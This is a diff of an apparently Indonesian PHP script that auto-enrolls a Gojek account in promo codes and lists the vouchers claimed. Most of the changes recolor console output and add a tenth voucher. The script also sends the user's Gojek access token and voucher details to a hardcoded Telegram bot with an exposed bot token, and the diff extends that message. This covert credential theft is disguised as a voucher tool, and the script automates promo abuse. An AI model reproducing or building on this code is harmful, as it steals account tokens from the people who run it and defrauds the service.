@@ -7,8 +7,8 @@ echo "\e[92m| ___________\e[93m•_+\e[92m_\e[93mBuat\e[92m_\e[93mPIN\e[92m_\e[9
 echo "\e[92m| _\e[91mUNTUK\e[92m_\e[91mREGISTRASI\e[92m_\e[91mSILAHKAN\e[92m_\e[91mHUBUNGI\e[92m_\e[91mADMIN\e[92m_|\n";
 echo "\e[92m| ___\e[93mTELEGRAM\e[92m_\e[91m:@mang*b*y\e[92m___________________|\n";
 echo "\e[92m| ___\e[93mGITHUB\e[92m___\e[91m:github.com/mrubay\e[92m___________|\n";
-echo "\e[92m| ___\e[93mVersion\e[92m__\e[91m:∆UBUR - UBUR 21∆\e[92m____________|\n";
-echo "\e[92m| ___\e[93mTime\e[92m_____\e[93m:".date('[d-m-Y] [H:i:s]')."\e[92m_____|\n";
+echo "\e[92m| ___\e[93mVersion\e[92m__\e[91m:∆UBUR\e[92m_\e[93m-\e[92m_\e[93mUBUR\e[92m_\e[93m21∆\e[92m____________|\n";
+echo "\e[92m| ___\e[93mTime\e[92m_____\e[93m:".date('[d-m-Y]\e[92m_\e[93m[H:i:s]')."\e[92m_____|\n";
 echo "\e[92m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n";
 	echo "\n";
 echo "\e[92m╔══════════════════════════════════╗\n";
@@ -98,10 +98,10 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $boba10 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAGOFOOD090320A"}');
         $messageboba10 = fetch_value($boba10,'"message":"','"');
         if(strpos($boba10, 'Promo kamu sudah bisa dipakai')){
-        echo "\n".color("red","+] Message: ".$messageboba10);
+        echo "\n".color("green","+] Message: ".$messageboba10);
         goto goride;
         }else{
-        echo "\n".color("red","-] Message: ".$messageboba10);
+        echo "\n".color("green","-] Message: ".$messageboba10);
         echo "\n".color("white","!] Claim voc GORIDE 8K");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
@@ -112,10 +112,10 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $boba19 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGORIDE"}');
         $messageboba19 = fetch_value($boba19,'"message":"','"');
         if(strpos($boba19, 'Promo kamu sudah bisa dipakai.')){
-        echo "\n".color("red","+] Message: ".$messageboba19);
+        echo "\n".color("green","+] Message: ".$messageboba19);
         goto goride;
         }else{
-        echo "\n".color("red","+] Message: ".$messageboba19);
+        echo "\n".color("green","+] Message: ".$messageboba19);
         goride:
         echo "\n".color("white","!] Claim voc Cashback 4k");
         echo "\n".color("yellow","!] Please wait");
@@ -126,7 +126,7 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         sleep(3);
         $boba11 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"BELANJAINAJA"}');
         $messageboba11 = fetch_value($boba11,'"message":"','"');
-        echo "\n".color("red","+] Message: ".$messageboba11);
+        echo "\n".color("green","+] Message: ".$messageboba11);
         echo "\n".color("white","!] Claim voc GOCAR 12K");
         echo "\n".color("yellow","!] Please wait");
         for($a=1;$a<=3;$a++){
@@ -136,7 +136,7 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         sleep(3);
         $boba09 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOCAR"}');
         $messageboba09 = fetch_value($boba09,'"message":"','"');
-        echo "\n".color("red","+] Message: ".$messageboba09);
+        echo "\n".color("green","+] Message: ".$messageboba09);
         sleep(3);
         $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
         $total = fetch_value($cekvoucher,'"total_vouchers":',',');
@@ -149,16 +149,18 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
         $voucher8 = getStr1('"title":"','",',$cekvoucher,"8");
         $voucher9 = getStr1('"title":"','",',$cekvoucher,"9");
+        $voucher10 = getStr1('"title":"','",',$cekvoucher,"10");
         echo "\n".color("white","!] Total voucher ".$total." : ");
-        echo color("red","1. ".$voucher1);
-        echo "\n".color("red","                     2. ".$voucher2);
-        echo "\n".color("red","                     3. ".$voucher3);
-        echo "\n".color("red","                     4. ".$voucher4);
-        echo "\n".color("red","                     5. ".$voucher5);
-        echo "\n".color("red","                     6. ".$voucher6);
-        echo "\n".color("red","                     7. ".$voucher7);
-        echo "\n".color("red","                     8. ".$voucher8);
-        echo "\n".color("red","                     9. ".$voucher9);
+        echo "\n".color("green","                     1. ".$voucher1);
+        echo "\n".color("green","                     2. ".$voucher2);
+        echo "\n".color("green","                     3. ".$voucher3);
+        echo "\n".color("green","                     4. ".$voucher4);
+        echo "\n".color("green","                     5. ".$voucher5);
+        echo "\n".color("green","                     6. ".$voucher6);
+        echo "\n".color("green","                     7. ".$voucher7);
+        echo "\n".color("green","                     8. ".$voucher8);
+        echo "\n".color("green","                     9. ".$voucher9);
+        echo "\n".color("green","                     10. ".$voucher10);
         echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
@@ -169,9 +171,10 @@ echo "\e[93m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
         $expired8 = getStr1('"expiry_date":"','"',$cekvoucher,'8');
         $expired9 = getStr1('"expiry_date":"','"',$cekvoucher,'9');
+        $expired10 = getStr1('"expiry_date":"','"',$cekvoucher,'10');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
 	$chatid = "785784404";
-	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]";
+	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."]";
 	$method	= "sendMessage";
 	$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
 	$post = [
